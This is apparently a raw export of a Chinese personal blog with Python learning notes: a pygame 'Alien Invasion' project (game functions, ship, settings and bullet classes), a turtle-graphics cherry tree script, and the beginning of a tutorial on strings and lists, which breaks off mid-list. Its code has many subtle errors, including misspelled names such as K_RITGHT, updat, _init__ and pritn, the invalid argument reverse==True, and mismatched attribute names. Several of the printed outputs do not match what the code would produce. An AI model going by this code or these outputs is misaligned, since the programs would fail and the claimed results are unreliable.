<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#game_functions.py</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;包含一系列函数，由它完成游戏的大部分工作.</span></span><br><span class="line"><span class="string">check_events()检测相关事件，按键的按下与松开，并且辅助check_keydown_events()和check_keyup_events()处理事件</span></span><br><span class="line"><span class="string">包含模块update_screen()用于每次执行主循环时的屏幕绘制</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_keydown_events</span>(<span class="params">event,ship</span>):<span class="comment">#检查鼠标键按下</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;响应按键&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> event.key == pygame.K_RITGHT:</span><br><span class="line">        ship.moving_right = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">elif</span> event.key == pygame.K_LEFT:</span><br><span class="line">        ship.moving_left = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_keyup_events</span>(<span class="params">event,ship</span>):<span class="comment">#检查鼠标键松开</span></span><br><span class="line">    <span class="keyword">if</span> event.key == pygame.K_RIGHT:</span><br><span class="line">        ship.moving_right = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">elif</span> event.key ==pygame.K_LEFT:</span><br><span class="line">        ship.moving_left = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_events</span>(<span class="params">event,ship</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;响应按键和鼠标事件&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> events <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">        <span class="keyword">if</span> events.<span class="built_in">type</span> == pygame.QUIT:</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">elif</span> events.<span class="built_in">type</span> == pygame.KEYDOWN:<span class="comment">#鼠标键按下时</span></span><br><span class="line">            check_keydown_events(event,ship)</span><br><span class="line">        <span class="keyword">elif</span> events.<span class="built_in">type</span> ==pygame.KEYUP:<span class="comment">#鼠标键松开时</span></span><br><span class="line">            check_keyup_events(event,ship)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_screen</span>(<span class="params">ai_settings,screen,ship</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;更新屏幕上的图像，并切换到新屏幕&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 每次循环都重新绘制屏幕</span></span><br><span class="line">    screen.fill(ai_settings.bg_color)  <span class="comment"># 这个方法只接受一个实参：一种颜色。</span></span><br><span class="line">    ship.blitme()  <span class="comment"># 将飞船绘制到屏幕</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 让最近绘制的屏幕可见</span></span><br><span class="line">    pygame.display.flip()  <span class="comment"># 命令Pygame让最近绘制的屏幕可见。营造平滑移动的效果。</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<hr>
<p><strong>ship.py</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Ship.py</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;包含__init__()、管理飞船位置的方法update()以及在屏幕上绘制飞船的方法blitme()&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Ship</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,ai_settings,screen</span>):<span class="comment">#screen指定了要将飞船绘制到什么地方</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化飞船并设置其初始位置&quot;&quot;&quot;</span></span><br><span class="line">        self.screen = screen</span><br><span class="line">        self.ai_settings = ai_settings</span><br><span class="line">        <span class="comment">#加载飞船图像并获取其外接矩形</span></span><br><span class="line">        self.image = pygame.image.load(<span class="string">&#x27;.\images\ship.bmp&#x27;</span>)</span><br><span class="line">        self.rect = self.image.get_rect()<span class="comment">#飞船图像</span></span><br><span class="line">        self.screen_rect = screen.get_rect()<span class="comment">#屏幕</span></span><br><span class="line">        <span class="comment">#将每艘新飞船放在屏幕底部中央</span></span><br><span class="line">        self.rect.centerx = self.screen_rect.centerx<span class="comment">#self.rect.centerx（飞船中心的x坐标）</span></span><br><span class="line">        self.rect.bottom = self.screen_rect.bottom<span class="comment">#self.rect.bottom（飞船下边缘的y坐标）</span></span><br><span class="line">        <span class="comment">#在飞船的属性center中存储小数值</span></span><br><span class="line">        self.center = <span class="built_in">float</span>(self.rect.centerx)</span><br><span class="line">        <span class="comment">#移动标志</span></span><br><span class="line">        self.moving_right = <span class="literal">False</span>  <span class="comment">#向右移动标志</span></span><br><span class="line">        self.mobing_left = <span class="literal">False</span> <span class="comment">#向左移动标志</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">updat</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;根据移动标志调整飞船的位置&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment">#更新飞船的center值，而不是rect</span></span><br><span class="line">        <span class="comment">#self.rect.right返回飞船外接矩形的右边缘的x坐标，如果这个值小于self.screen_rect.right的值，就说明飞船未触及屏幕右边缘</span></span><br><span class="line">        <span class="keyword">if</span> self.moving_right <span class="keyword">and</span> self.rect.right &lt; self.screen_rect.right:</span><br><span class="line">            self.rect.centerx += self.ai_settings.ship_speed_factor</span><br><span class="line">        <span class="comment">#如果rect的左边缘的x坐标大于零，就说明飞船未触及屏幕左边缘</span></span><br><span class="line">        <span class="keyword">if</span> self.moving_left <span class="keyword">and</span> self.rect.left &gt; <span class="number">0</span>:</span><br><span class="line">            self.rect.centerx -= self.ai_settings.ship_speed_factor</span><br><span class="line">        <span class="comment">#根据self.rect.center更新rect对象</span></span><br><span class="line">        self.rect.centerx = self.center</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">blitme</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;在指定位置绘制飞船&quot;&quot;&quot;</span></span><br><span class="line">        self.screen.blit(self.image,self.rect)</span><br></pre></td></tr></table></figure></div>

<hr>
<p>settings.py</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#setting.py</span></span><br><span class="line"><span class="comment">#包含Setting类，只含有__init__()，初始化控制游戏外观和飞船的速度属性,射击子弹的属性</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Settings</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;存储《外星入侵》的所有设置的类&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment">#初始化游戏的设置</span></span><br><span class="line">        <span class="comment">#屏幕设置</span></span><br><span class="line">        self.screen_width = <span class="number">1200</span></span><br><span class="line">        self.screen_height = <span class="number">800</span></span><br><span class="line">        self.bg_color = (<span class="number">230</span>,<span class="number">230</span>,<span class="number">230</span>)<span class="comment">#灰色</span></span><br><span class="line">        <span class="comment">#飞船的设置</span></span><br><span class="line">        self.ship_speed_factor = <span class="number">1.5</span></span><br><span class="line">        <span class="comment">#设置子弹</span></span><br><span class="line">        self.bullet_speed_factor = <span class="number">1</span></span><br><span class="line">        self.bullet_width = <span class="number">3</span></span><br><span class="line">        self.bullet_hight = <span class="number">15</span></span><br><span class="line">        self.bullet_color = <span class="number">60</span>,<span class="number">60</span>,<span class="number">60</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<hr>
<p><strong>bullet.py</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#bullet.py</span></span><br><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="keyword">from</span> pygame.sprite <span class="keyword">import</span> Sprite<span class="comment">#精灵，可将游戏中相关的元素编组，进而同时操作编组中的所有元素。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bullet</span>(<span class="title class_ inherited__">Sprite</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;一个对飞船发射的子弹进行管理的类&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, ai_settings, screen,ship</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;在飞船所处的位置创建一个子弹对象&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">super</span>(Bullet,self)._init__()</span><br><span class="line">        self.screen = screen</span><br><span class="line"></span><br><span class="line">        <span class="comment">#在(0,0)处创建一个表示子弹的矩形，在设置正确的位置</span></span><br><span class="line">        self.rect = pygame.Rect(<span class="number">0</span>,<span class="number">0</span>,ai_settings.bullet_width,ai_settings.bullet_height)</span><br><span class="line">        self.rect.centerx = ship.rect.centerx</span><br><span class="line">        self.rect.top = ship.rect.top</span><br><span class="line"></span><br><span class="line">        <span class="comment">#存储用小数表示的位置</span></span><br><span class="line">        self.y = <span class="built_in">float</span>(self.rect.y)</span><br><span class="line">        self.color  = ai_settings.bullet_color</span><br><span class="line">        self.speed_factor  = ai_settings.bullet_speed_factor</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;向上移动子弹&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment">#更新表示子弹的位置的小数值</span></span><br><span class="line">        self.y -= self.speed_factor</span><br><span class="line">        <span class="comment">#更新表示子弹的rect位置</span></span><br><span class="line">        self.rect.y = self.y</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">draw_bullet</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;在屏幕上绘制子弹&quot;&quot;&quot;</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;函数draw.rect()使用存储在self.color中的颜色填充表示子弹的rect占据的屏幕部分&quot;&quot;&quot;</span></span><br><span class="line">        pygame.draw.rect(self.screen,self.color,self.rect)</span><br></pre></td></tr></table></figure></div>



<hr>
<p><strong>images文件</strong></p>
<ul>
<li><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ship.bmp" alt="ship"></li>
</ul>
<hr>
<p>项目进度：12.6.4</p>
<p>敬请T期待</p>
<h2 id="樱花树"><a href="#樱花树" class="headerlink" title="樱花树"></a>樱花树</h2><blockquote>
<p>原文链接：<a class="link" href="https://blog.csdn.net/sxc1414749109/article/details/139392284">https://blog.csdn.net/sxc1414749109/article/details/139392284 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#cherry.py</span><br><span class="line">from turtle import *</span><br><span class="line">from random import random</span><br><span class="line">from math import cos,radians</span><br><span class="line"></span><br><span class="line">def draw_tree(branch_length,level):</span><br><span class="line">    #递归绘制树干</span><br><span class="line">    pendown()</span><br><span class="line">    #根据当前的方向和角度改变颜色</span><br><span class="line">    t=cos(radians(heading()+45))/8+0.25</span><br><span class="line">    pencolor(t,t,t)</span><br><span class="line">    pensize(branch_length/10)</span><br><span class="line">    forward(branch_length)</span><br><span class="line"></span><br><span class="line">    if level &gt; 0 :#如果还有分支级别</span><br><span class="line">        #随意生成分支角度和长度</span><br><span class="line">        angle1=random()*15+10</span><br><span class="line">        angle2=random()*15+10</span><br><span class="line">        new_length=branch_length*(random()*0.25+0.7)</span><br><span class="line"></span><br><span class="line">        #绘制右侧分支</span><br><span class="line">        right(angle1)</span><br><span class="line">        draw_tree(new_length,level-1)</span><br><span class="line"></span><br><span class="line">        #绘制左侧分支</span><br><span class="line">        left(angle1+angle2)</span><br><span class="line">        draw_tree(new_length,level-1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        right(angle2)</span><br><span class="line">    else: # 如果已经到达最底层</span><br><span class="line">        # 在分支末端绘制花朵</span><br><span class="line">        draw_flower()</span><br><span class="line"></span><br><span class="line">    penup()</span><br><span class="line">    backward(branch_length)</span><br><span class="line"></span><br><span class="line">#绘制树枝末端树叶</span><br><span class="line">def draw_flower():</span><br><span class="line"></span><br><span class="line">    right(90)#调整方向，准备绘制花朵</span><br><span class="line">    pencolor(&quot;pink&quot;)</span><br><span class="line">    circle(3)#绘制花朵</span><br><span class="line"></span><br><span class="line">    left(90)#调整方向，准备绘制其他元素</span><br><span class="line"></span><br><span class="line">    #偶尔在地面上绘制落花</span><br><span class="line">    if random() &gt; 0.7:</span><br><span class="line">        penup()#抬笔，停止绘画</span><br><span class="line">        current_heading=heading()#记录当前方向</span><br><span class="line">        angle = -40+random()*80</span><br><span class="line">        setheading(angle)#设置方向</span><br><span class="line">        #计算落花的距离</span><br><span class="line">        distance=int(800 * random() * 0.5 + 400 * random() * 0.3 + 200 * random() * 0.2)</span><br><span class="line">        forward(distance)</span><br><span class="line">        #落笔</span><br><span class="line">        pendown()</span><br><span class="line">        right(90)</span><br><span class="line">        #根据当前的方向和角度计算颜色</span><br><span class="line">        n=cos(radians(heading()-45))/4+0.5</span><br><span class="line">        pencolor(n*0.5+0.5, 0.4+n*0.4, 0.4+n*0.4)</span><br><span class="line">        circle(2)</span><br><span class="line"></span><br><span class="line">        left(90)</span><br><span class="line">        penup()</span><br><span class="line">        setheading(angle)</span><br><span class="line">        backward(distance)#后退回原来的位置</span><br><span class="line">        setheading(current_heading)#恢复至原始方向</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    &quot;&quot;&quot;主函数用于设置绘图环境并开始绘制过程&quot;&quot;&quot;</span><br><span class="line">    bgcolor(0.956, 0.9255, 0.9882)  # 设置背景颜色为浅紫色</span><br><span class="line">    speed(10)</span><br><span class="line">    hideturtle()</span><br><span class="line">    tracer(100)#设置追踪延迟</span><br><span class="line"></span><br><span class="line">    penup()#抬笔</span><br><span class="line">    backward(100)#后退一段距离</span><br><span class="line">    left(90)</span><br><span class="line">    backward(300)</span><br><span class="line"></span><br><span class="line">    draw_tree(100, 12)</span><br><span class="line">    done()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main() #主函数</span><br></pre></td></tr></table></figure></div>

<p>效果图：</p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/cherry.png" alt="cherry"></p>
]]></content>
      <categories>
        <category>Languages</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>实战项目</tag>
      </tags>
  </entry>
  <entry>
    <title>Python从入门到实践</title>
    <url>/2024/01/21/Python%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E8%B7%B5/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">

<h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><h3 id="概念定义"><a href="#概念定义" class="headerlink" title="概念定义"></a>概念定义</h3><blockquote>
<p>字符串是一系列字符</p>
</blockquote>
<h3 id="使用字符串"><a href="#使用字符串" class="headerlink" title="使用字符串"></a>使用字符串</h3><blockquote>
<ol>
<li>字符串元素的大小写</li>
</ol>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">name=<span class="string">&quot;Ada Lovelace&quot;</span></span><br><span class="line"><span class="built_in">print</span>(name)</span><br><span class="line"><span class="built_in">print</span>(name.title())<span class="comment">#首字母大写</span></span><br><span class="line"><span class="built_in">print</span>(name.upper())<span class="comment">#所有字母大写</span></span><br><span class="line"><span class="built_in">print</span>(name.lower())<span class="comment">#所有字母小写</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Ada Lovelace</span><br><span class="line">Ada Lovelace</span><br><span class="line">ADA LOVELACE</span><br><span class="line">ada lovelace</span><br></pre></td></tr></table></figure></div>

<ol start="2">
<li><p>删除字符串空白</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;language=<span class="string">&#x27; python </span></span><br><span class="line"><span class="string">&gt;&gt;&gt;language</span></span><br><span class="line"><span class="string">&#x27;</span> python <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;language.lstrip()#删除左端空白</span></span><br><span class="line"><span class="string">&#x27;</span>python <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;language.rstrip()#删除右端空白</span></span><br><span class="line"><span class="string">&#x27;</span> python<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;language.strip()#删除左右两端空白</span></span><br><span class="line"><span class="string">&#x27;</span>python<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>删除前缀</p>
</li>
</ol>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;nostarch_url=<span class="string">&quot;https://nostarch.com&quot;</span></span><br><span class="line">&gt;&gt;&gt;nostarch_url.removeprefix(<span class="string">&#x27;https://&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;nostarch.com&#x27;</span></span><br></pre></td></tr></table></figure></div>
</blockquote>
<h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><h3 id="概念定义-1"><a href="#概念定义-1" class="headerlink" title="概念定义"></a>概念定义</h3><blockquote>
<p>列表(list)是由一系列按照特定顺序排列的元素组成</p>
</blockquote>
<h3 id="访问列表元素"><a href="#访问列表元素" class="headerlink" title="访问列表元素"></a>访问列表元素</h3><blockquote>
<ol>
<li>利用元素的索引来访问元素值</li>
</ol>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">bicycles=[<span class="string">&#x27;trek&#x27;</span>,<span class="string">&#x27;cannondale&#x27;</span>,<span class="string">&#x27;redline&#x27;</span>,<span class="string">&#x27;specialized&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(bicycles[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(bicycles[<span class="number">3</span>])</span><br><span class="line"><span class="built_in">print</span>(bicycles[-<span class="number">1</span>])</span><br><span class="line">messages=<span class="string">f&quot;My first bicycle was a <span class="subst">&#123;bicycles[<span class="number">0</span>].title()&#125;</span>&quot;</span><span class="string">&#x27;&#x27;&#x27;在字符串中插入变量的值，使用f字符串，f为format的简写，Python通过把花括号的变量替换成变量的值来设置字符串的格式&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(messages)</span><br><span class="line"><span class="comment">#列表元素的索引是从0开始</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;列表元素索引为3的元素为specialized,而不是redline&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;索引-1表示列表的最后一个元素&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#bicycles[0]为对象；title()为方法即函数；</span></span><br><span class="line"><span class="comment">#bicycles[0].title()为对象调用title()方法的形式</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">trek</span><br><span class="line">specialized</span><br><span class="line">specialized</span><br><span class="line">My first bicyvle was a Trek</span><br></pre></td></tr></table></figure></div>

<ol start="2">
<li>修改列表元素</li>
</ol>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#motorcycles.py</span></span><br><span class="line">motorcycles=[<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(motorcycles)</span><br><span class="line"></span><br><span class="line">motorcycles[<span class="number">0</span>]=<span class="string">&#x27;ducati&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(motorcycles)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;ducati&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>]</span><br></pre></td></tr></table></figure></div>

<ol start="3">
<li>添加列表元素</li>
</ol>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#motorcycles.py</span></span><br><span class="line">motorcycles=[<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>]</span><br><span class="line"></span><br><span class="line">motorcycles.append(<span class="string">&#x27;ducati&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(motorcycles)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>,<span class="string">&#x27;ducati&#x27;</span>]</span><br></pre></td></tr></table></figure></div>

<ol start="4">
<li><p>删除列表元素</p>
<ul>
<li><p>使用del语句删除列表元素</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#motorcycles.py</span></span><br><span class="line">motorcycles=[<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(motorcycles)</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> motorcycles[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(motorcycles)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>]</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>使用pop()方法删除列表元素，并返回删除值</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#motorcycles.py</span></span><br><span class="line">motorcycles=[<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(motorcycles)</span><br><span class="line"></span><br><span class="line">motorcycle=motorcycles.pop(<span class="number">0</span>)<span class="comment">#括号内为标索引则默认删除最后一个元素，并将其返回</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;The first motorcycle I woned was a <span class="subst">&#123;motorcycle.title()&#125;</span>.&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#x27;honda&#x27;,&#x27;yamaha&#x27;,&#x27;suzuki&#x27;]</span><br><span class="line">The first motorcycle I woned was a honda.</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>根据值删除元素</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">motorcycles=[<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>,<span class="string">&#x27;ducati&#x27;</span>]</span><br><span class="line">too_expensive=<span class="string">&#x27;ducati&#x27;</span></span><br><span class="line">mororcycles.remove(too_expensive)</span><br><span class="line"><span class="built_in">print</span>(motorcycles)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;\nA <span class="subst">&#123;too_expensive.title()&#125;</span> is too expensive for me!&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>]</span><br><span class="line">                                        </span><br><span class="line">A Ducati is too expensive <span class="keyword">for</span> me!</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
<li><p>使用sort()方法对列表进行永久排序</p>
<ul>
<li>正序(字母表)</li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#cars.py</span></span><br><span class="line">cars = [<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;toyota&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>]</span><br><span class="line">cars.sort()</span><br><span class="line"><span class="built_in">print</span>(cars)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>,<span class="string">&#x27;toyota&#x27;</span>]</span><br></pre></td></tr></table></figure></div>

<ul>
<li>反序(反字母表)</li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#cars.py</span></span><br><span class="line">cars = [<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;toyota&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>]</span><br><span class="line">cars.sort(reverse==<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(cars)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;toyota&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>,<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;audi&#x27;</span>]</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>使用sorted()方法对列表进行临时排序</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#cars.py</span></span><br><span class="line">cars = [<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;toyota&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Here is the orignal list:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(cars)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Here is the sorted list:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(cars))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(cars,reverse==<span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line">pritn(<span class="string">&quot;Here is the orignal list agin:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(cars)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Here is the orignal list:</span><br><span class="line">[<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;toyota&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>]</span><br><span class="line">Here is the sorted list:</span><br><span class="line">[<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>,<span class="string">&#x27;toyota&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;toyota&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>,<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;audi&#x27;</span>]</span><br><span class="line">Here is the orignal list agin:</span><br><span class="line">[<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;toyota&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>]</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>反向打印列表</p>
